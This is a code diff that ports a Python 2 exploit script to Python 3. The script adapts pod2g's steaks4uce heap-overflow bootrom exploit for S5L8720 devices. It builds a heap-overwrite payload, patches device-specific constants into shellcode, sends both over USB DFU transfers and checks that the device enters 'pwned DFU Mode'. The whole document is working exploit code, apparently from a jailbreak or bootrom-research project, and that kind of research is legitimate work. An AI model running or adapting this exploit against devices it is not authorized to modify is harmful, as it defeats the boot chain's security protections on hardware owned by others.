@@ -1,3 +1,4 @@
+#!/Users/CFDA_BOLOGNA/opt/anaconda3/bin/python
 # Credit: This file is based on steaks4uce exploit (heap overflow) by pod2g.
 
 import struct, sys, time
@@ -63,17 +64,17 @@ constants_240_5_1 = [
 ]
 
 class DeviceConfig:
-  def __init__(self, version, constants):
-    self.version = version
-    self.constants = constants
+    def __init__(self, version, constants):
+        self.version = version
+        self.constants = constants
 
 configs = [
-  DeviceConfig('240.4',   constants_240_4),   # S5L8720 (old bootrom)
-  DeviceConfig('240.5.1', constants_240_5_1), # S5L8720 (new bootrom)
+    DeviceConfig('240.4',   constants_240_4),   # S5L8720 (old bootrom)
+    DeviceConfig('240.5.1', constants_240_5_1), # S5L8720 (new bootrom)
 ]
 
 # Pad to length 256 and add heap data for overwrite
-payload = '\x00' * 256 + struct.pack('<14I',
+payload = b'\x00' * 256 + struct.pack('<14I',
               # 1. Allocated chunk to be freed
               # Chunk header: (size 0x8)
         0x84, #   0x00: previous_chunk
@@ -97,61 +98,63 @@ payload = '\x00' * 256 + struct.pack('<14I',
 )
 
 def generate_shellcode(constants):
-  with open('bin/steaks4uce-shellcode.bin', 'rb') as f:
-    shellcode = f.read()
+    with open('bin/steaks4uce-shellcode.bin', 'rb') as f:
+        shellcode = f.read()
 
-  # Shellcode has placeholder values for constants; check they match and replace with constants from config
-  placeholders_offset = len(shellcode) - 4 * len(constants)
-  for i in range(len(constants)):
-    offset = placeholders_offset + 4 * i
-    (value,) = struct.unpack('<I', shellcode[offset:offset + 4])
-    assert value == 0xBAD00001 + i
+    # Shellcode has placeholder values for constants; check they match and replace with constants from config
+    placeholders_offset = len(shellcode) - 4 * len(constants)
+    for i in range(len(constants)):
+        offset = placeholders_offset + 4 * i
+        (value,) = struct.unpack('<I', shellcode[offset:offset + 4])
+        assert value == 0xBAD00001 + i
 
-  return shellcode[:placeholders_offset] + struct.pack('<%sI' % len(constants), *constants)
+    return shellcode[:placeholders_offset] + struct.pack('<%sI' % len(constants), *constants)
 
 def exploit():
-  print '*** based on steaks4uce exploit (heap overflow) by pod2g ***'
+    print('*** based on steaks4uce exploit (heap overflow) by pod2g ***')
 
-  device = dfu.acquire_device()
-  print 'Found:', device.serial_number
+    device = dfu.acquire_device()
+    print('Found:', device.serial_number)
 
-  if 'PWND:[' in device.serial_number:
-    print 'Device is already in pwned DFU Mode. Not executing exploit.'
-    return
+    if 'PWND:[' in device.serial_number:
+        print('Device is already in pwned DFU Mode. Not executing exploit.')
+        return
 
-  if 'CPID:8720' not in device.serial_number:
-    print 'ERROR: Not a compatible device. This exploit is for S5L8720 devices only. Exiting.'
-    sys.exit(1)
+    if 'CPID:8720' not in device.serial_number:
+        print('ERROR: Not a compatible device. This exploit is for S5L8720 devices only. Exiting.')
+        sys.exit(1)
 
-  chosenConfig = None
-  for config in configs:
-    if 'SRTG:[iBoot-%s]' % config.version in device.serial_number:
-      chosenConfig = config
-      break
+    chosenConfig = None
+    for config in configs:
+        if 'SRTG:[iBoot-%s]' % config.version in device.serial_number:
+            chosenConfig = config
+            break
 
-  if chosenConfig is None:
-    print 'ERROR: CPID is compatible, but serial number string does not match.'
-    print 'Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.'
-    sys.exit(1)
+    if chosenConfig is None:
+        print('ERROR: CPID is compatible, but serial number string does not match.')
+        print('Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.')
+        sys.exit(1)
 
-  dfu.reset_counters(device)
-  dfu.send_data(device, generate_shellcode(chosenConfig.constants))
-  dfu.send_data(device, payload)
-  assert len(device.ctrl_transfer(0xA1, 1, 0, 0, len(payload), 1000)) == len(payload)
-  dfu.release_device(device)
+    dfu.reset_counters(device)
+    dfu.send_data(device, generate_shellcode(chosenConfig.constants))
+    dfu.send_data(device, payload)
+    
+    response = device.ctrl_transfer(0xA1, 1, 0, 0, len(payload), 1000)
+    assert len(response) == len(payload)
+    dfu.release_device(device)
 
-  time.sleep(0.01)
+    time.sleep(0.01)
 
-  device = dfu.acquire_device()
-  dfu.usb_reset(device)
-  dfu.release_device(device)
+    device = dfu.acquire_device()
+    dfu.usb_reset(device)
+    dfu.release_device(device)
 
-  device = dfu.acquire_device()
-  failed = 'PWND:[steaks4uce]' not in device.serial_number
-  dfu.release_device(device)
+    device = dfu.acquire_device()
+    failed = 'PWND:[steaks4uce]' not in device.serial_number
+    dfu.release_device(device)
 
-  if failed:
-    print 'ERROR: Exploit failed. Device did not enter pwned DFU Mode.'
-    sys.exit(1)
+    if failed:
+        print('ERROR: Exploit failed. Device did not enter pwned DFU Mode.')
+        sys.exit(1)
 
-  print 'Device is now in pwned DFU Mode.'
+    print('Device is now in pwned DFU Mode.')
